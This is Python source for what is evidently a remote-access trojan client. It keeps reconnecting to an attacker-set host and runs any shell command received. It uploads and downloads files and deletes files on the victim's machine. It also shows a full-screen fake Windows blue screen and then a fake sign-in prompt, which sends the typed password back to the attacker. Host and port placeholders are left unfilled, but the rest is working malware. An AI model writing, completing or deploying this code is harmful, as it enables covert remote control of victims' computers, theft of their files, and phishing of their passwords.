import socket
import os
import time
import sys
import subprocess
import threading
from queue import Queue
from shutil import copyfile

version = "1.0"

host_list = ["HOST IP GOES HERE"]

def connect(port):

    global s
    print("\nFinding Server...")

    while True:
        try:
            while True:
                for host in host_list:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((host, port))
                        break
                    except:
                        continue

                s.send(str.encode("-client-"))
                break

            print("Connection Found\n")
            break
        except:
            continue

connect(HOST PORT GOES HERE)

while True:
    try:
        data = s.recv(40960).decode('utf-8')

        if data == "cwd":
            s.send(str.encode(os.getcwd()))

        elif "cd " in data:
            try:
                data = data.replace("cd ", "")
                os.chdir(os.path.expanduser(data))
                s.send(str.encode(os.getcwd()))
            except:
                s.send("dir does not exist".encode('utf-8'))

        elif "file transfer " in data:

            path = data.replace("file transfer ", "")

            print("----------\nEstablishing Socket")

            while True:
                try:
                    while True:
                        for host in host_list:
                            try:
                                f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                f.connect((host, TRANSFER PORT GOES HERE))
                                break
                            except:
                                continue

                        f.send(str.encode("-client-"))
                        break

                    print("Connection Found")
                    break
                except:
                    continue

            print("----------\nCalculating Byte Recieving Length")

            try:
                data_len = f.recv(64).decode('utf-8')
                data_len = int(data_len)
                print(f"Byte length : {data_len}")
            except Exception as e:
                print(e)

            print("----------\nAttempting Byte Recieving/Writing")

            try:
                if os.path.exists(f"{os.getcwd()}/{path}"):
                    print(f"Overwriting {path}")
                    os.remove(f"{os.getcwd()}/{path}")
                file = open(f"{os.getcwd()}/{path}", "wb")
                print("File Opened Successfully")
                if data_len < 819200:
                    bytes = f.recv(data_len)
                    file.write(bytes)
                else:
                    n = round(data_len / 40960)
                    if str(n) in str(data_len / 40960):
                        n += 1
                    for i in range(n):
                        bytes = f.recv(40960)
                        file.write(bytes)
                file.close()
            except Exception as e:
                print("Unexpected error occured with File Writing/Recieving")
                print(e)

            f.close()
            print("----------")

        elif "file collect " in data:

            f_name = data.replace("file collect ", "")

            print("----------\nEstablishing Socket")

            while True:
                try:
                    while True:
                        for host in host_list:
                            try:
                                f = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                f.connect((host, TRANSFER PORT GOES HERE))
                                break
                            except:
                                continue

                        f.send(str.encode("-client-"))
                        time.sleep(5)
                        break

                    print("Connection Found")
                    break
                except:
                    continue


            print("----------\nConfiguring File Byte Length")

            if not os.path.exists(f"{os.getcwd()}/{f_name}"):
                print("Error: This file path does not exist.")
                f.send("0".encode('utf-8'))
                data_len = 0
            else:
                try:
                    data_len = os.path.getsize(f"{os.getcwd()}/{f_name}")
                    f.send(str(data_len).encode('utf-8'))
                    print(f"Sent File Byte Length : {data_len}")
                except Exception as e:
                    print(e)

            time.sleep(1)

            print("----------\nAttempting Byte Transfer")

            try:
                if data_len != 0:
                    time.sleep(1)
                    file = open(f"{os.getcwd()}/{f_name}", "rb")
                    data = file.read(data_len)
                    f.sendall(data)
                    file.close()
                    print("Bytes succesfully sent file over TCP")
            except Exception as e:
                print(f"Error occured with sending bytes : {e}")

            f.close()
            print("----------")


        elif "rename " in data:
            pass

        elif "show bsd" == data:

            #GUI Interface will be created here.
            from tkinter import *

            def disable_event():
                pass


            def bsd():
                global spacer_h
                global sad
                global text
                global error

                spacer_h = Label(root, text=" ", font=('Arial', '300'), bg="#0078D7")
                spacer_h.grid(row = 2)

                sad = Label(root, text=":(", bg="#0078D7", fg="white", font=('Segoe UI','140'), justify="left")
                sad.grid(sticky = 'W', column = 2, row = 2)

                text = Label(root, text="Your PC ran into a problem and needs to restart. We're\njust collecting some error info, and then we'll restart for\nyou.\n\n", bg="#0078D7", fg="white", font=('Segoe UI','30'), justify="left")
                text.grid(sticky = 'W', column = 2, row = 3)

                error = Label(root, text="If you'd like to know more, you can search online later for this error: HAL_INITIALIZATION_FAILED", bg="#0078D7", fg="white", font=('Segoe UI','15'), justify="left")
                error.grid(sticky = 'W', column = 2, row = 4)

            def restart():
                text.grid_remove()
                sad.grid_remove()
                spacer_h.grid_remove()
                error.grid_remove()

                root.configure(bg="black")

            def log_in():
                def on_entry_click(event):
                    if password.get() == 'Password':
                        password.delete(0, "end") # delete all the text in the password
                        password.insert(0, '') #Insert blank for user input
                        password.config(fg = 'black', show="*")

                def on_focusout(event):
                    if password.get() == '':
                        password.insert(0, 'Password')
                        password.config(fg = 'grey', show="")


                root.configure(bg="#0078D7")

                global username
                global password
                global enter

                credentials = Frame(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight())
                credentials.place(relx=0.5, rely=0.5, anchor = 'center')
                username = Label(credentials, text=socket.gethostname(), fg="white", bg="#0078D7", font=('Segoe UI', '25'), pady=20)
                username.pack()

                password = Entry(credentials, bg="white", borderwidth=0, font=('Segoe UI','15'), width = 23)
                password.insert(0, 'Password')
                password.bind('<FocusIn>', on_entry_click)
                password.bind('<FocusOut>', on_focusout)
                password.config(fg = 'grey')
                password.pack()

                button_frame = Frame(root, highlightthickness=2, highlightcolor="white", highlightbackground="white")
                enter = Button(button_frame, bg="#0070D7", fg="white", text="Sign In", width = 35, border=0, command=send_password)
                button_frame.place(relx=0.5, rely=0.6, anchor = 'center')
                enter.pack()

            def send_password():
                passkey = password.get()
                s.send(f"Password: {passkey}".encode('utf-8'))
                root.destroy()

            root = Tk()
            root.title("Error")
            root.overrideredirect(True)
            root.protocol("WM_DELETE_WINDOW", disable_event)
            root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()+20}")

            root.configure(bg="#0078D7")

            bsd()
            root.after(6000, restart)
            root.after(15000, log_in)

            root.mainloop()

            print("----------")

        elif "delete " in data:

            data = data.replace("delete ", "")
            os.remove(f"{os.getcwd()}/{data}")

        elif len(data) > 0:
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + " "))

    except Exception as e:
        s.close()
        print(f"Processes Terminated : {e}")
        connect(HOST PORT GOES HERE)
